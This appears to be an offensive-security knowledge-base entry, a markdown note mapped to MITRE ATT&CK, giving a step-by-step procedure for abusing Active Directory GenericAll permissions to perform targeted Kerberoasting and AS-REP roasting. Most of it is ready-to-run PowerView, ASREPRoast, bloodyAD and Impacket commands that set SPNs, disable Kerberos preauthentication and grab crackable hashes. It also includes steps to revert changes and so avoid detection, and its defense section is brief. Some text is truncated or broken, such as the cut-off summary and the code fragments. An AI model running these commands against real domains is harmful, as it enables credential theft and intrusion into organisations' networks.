---
id: c811fdfb-791f-4fd6-935f-2802a6c53122
name: Active Directory ACL Abuse via Kerberoasting and AS-REP Roasting
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:06.722861+00:00'
updated_at: '2023-04-10T20:26:07.494178+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
- '[[Silver Ticket|T1558.002 - Silver Ticket]]'
tags:
- '[[Abusing Active Directory ACLs/ACEs]]'
- '[[Active Directory Attacks]]'
- '[[GenericAll]]'
commands:
- '[[Check for interesting permissions on accounts]]'
- '[[Check if current user has already an SPN setted]]'
- '[[Convert userAccountControl value]]'
- '[[Convert userAccountControl value]]'
- '[[Force set the SPN on the account: Targeted Kerberoasting]]'
- '[[Grab ASREP hash]]'
- '[[Grab the ticket]]'
- '[[Grab the ticket for [Target_User]]]'
- '[[Modify user account control for [Target_User]]]'
- '[[Modify userAccountControl value]]'
- '[[Remove the SPN]]'
- '[[Revert userAccountControl value]]'
- '[[Set back the user account control for [Target_User]]]'
---

# Active Directory ACL Abuse via Kerberoasting and AS-REP Roasting

## Summary

This procedure involves abusing Active Directory ACLs/ACEs to gain access to Kerberos tickets, which can be used to crack passwords and gain access to sensitive information. By targeting accounts with the GenericAll permission, attackers can use Kerberoasting and AS-REP Roasting to extract service 

## Description

# Description

This procedure involves abusing Active Directory ACLs/ACEs to gain access to Kerberos tickets, which can be used to crack passwords and gain access to sensitive information. By targeting accounts with the GenericAll permission, attackers can use Kerberoasting and AS-REP Roasting to extract service tickets and user data. Kerberoasting involves requesting a service ticket for a service principal name (SPN) associated with a user account, which can then be cracked offline to reveal the user's password. AS-REP Roasting involves requesting an AS-REP ticket, which can also be cracked offline to reveal the user's password.

From a technical standpoint, this procedure involves querying Active Directory for accounts with the GenericAll permission, and then using tools such as Rubeus or Impacket to request and extract Kerberos tickets. Business value of this attack includes gaining access to sensitive data, such as financial information, intellectual property, or personally identifiable information (PII).

## Requirements

1. Valid domain credentials

1. Access to a domain-joined Windows machine

1. Tools such as Rubeus or Impacket

## Defense

1. Limit the use of GenericAll permission and only grant it to trusted users and groups

1. Monitor Active Directory for changes to ACLs/ACEs

1. Implement strong password policies to mitigate the risk of password cracking

## Objectives

1. Extract Kerberos tickets for user accounts with the GenericAll permission

1. Crack Kerberos tickets offline to reveal user passwords

1. Gain access to sensitive information and data

# Instructions

1. To perform Kerberoasting via SPN, follow these steps:
1. Use Invoke-ACLScanner to check for interesting permissions on accounts.
2. Use Get-DomainUser to check if the current user already has an SPN set.
3. Use Set-DomainObject to force set the SPN on the target account.
4. Use Get-DomainSPNTicket to grab the ticket.
5. Use Set-DomainObject to remove the SPN.

**Code**: [[# Check for interesting permissions on accounts:
I]]

> Kerberoasting via SPN is a technique used to extract password hashes from Active Directory. This technique involves setting an SPN on a target account, requesting a Service Ticket (ST), and then using the hash of the ST to perform a Kerberoasting attack. The SPN can be set using the Set-DomainObject cmdlet in PowerView2 or PowerView3. Once the SPN has been set, the Get-DomainSPNTicket cmdlet can be used to grab the ticket. Finally, the Set-DomainObject cmdlet can be used to remove the SPN.

**Command** ([[Check for interesting permissions on accounts]]):

```bash
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
```

**Command** ([[Check if current user has already an SPN setted]]):

```bash
PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
```

**Command** ([[Force set the SPN on the account: Targeted Kerberoasting]]):

```bash
PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
```

**Command** ([[Grab the ticket]]):

```bash
$User = Get-DomainUser username 
PowerView2 > $User | Get-DomainSPNTicket | fl
PowerView2 > $User | Select serviceprincipalname
```

**Command** ([[Remove the SPN]]):

```bash
PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
```

2. To use this command, replace 'username' with the name of the victim's account and 'domain.local' with the name of the domain. Run the command in PowerShell with appropriate privileges.

**Code**: [[# Modify the userAccountControl
PowerView2 > Get-D]]

> This command allows an attacker to obtain a user's AS-REP hash, which can be cracked offline to obtain the user's password. The attack works by modifying the victim's 'userAccountControl' attribute to disable Kerberos preauthentication, which allows the attacker to request the AS-REP hash without providing a valid password. Once the hash is obtained, the attribute is changed back to its original value to avoid detection.

**Command** ([[Convert userAccountControl value]]):

```bash
PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
```

**Command** ([[Modify userAccountControl value]]):

```bash
PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
```

**Command** ([[Grab ASREP hash]]):

```bash
ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
```

**Command** ([[Revert userAccountControl value]]):

```bash
PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
```

**Command** ([[Convert userAccountControl value]]):

```bash
PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
```

3. To modify the userAccountControl and grab a ticket, follow these steps:

**Code**: [[# Modify the userAccountControl
$ bloodyAD.py --ho]]

> 1. Replace [DC IP] with the IP address of the domain controller.
2. Replace [DOMAIN] with the name of the domain.
3. Replace [AttackerUser] with the name of the attacker user.
4. Replace [MyPassword] with the password of the attacker user.
5. Replace [Target_User] with the name of the user whose userAccountControl needs to be modified and ticket needs to be grabbed.
6. Run the first command to modify the userAccountControl.
7. Run the second command to grab the ticket.
8. Replace <AS_REP_responses_format [hashcat | john]> with the desired format for the output file.
9. Replace <output_AS_REP_responses_file> with the desired name for the output file.
10. Run the third command to set back the userAccountControl.

**Command** ([[Modify user account control for [Target_User]]]):

```bash
$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
```

**Command** ([[Grab the ticket for [Target_User]]]):

```bash
$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

**Command** ([[Set back the user account control for [Target_User]]]):

```bash
$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[Kerberoasting|T1558.003 - Kerberoasting]]
- [[Silver Ticket|T1558.002 - Silver Ticket]]

## Commands Used

- [[Check for interesting permissions on accounts]]
- [[Check if current user has already an SPN setted]]
- [[Convert userAccountControl value]]
- [[Convert userAccountControl value]]
- [[Force set the SPN on the account: Targeted Kerberoasting]]
- [[Grab ASREP hash]]
- [[Grab the ticket]]
- [[Grab the ticket for [Target_User]]]
- [[Modify user account control for [Target_User]]]
- [[Modify userAccountControl value]]
- [[Remove the SPN]]
- [[Revert userAccountControl value]]
- [[Set back the user account control for [Target_User]]]

## Tags

- [[Abusing Active Directory ACLs/ACEs]]
- [[Active Directory Attacks]]
- [[GenericAll]]
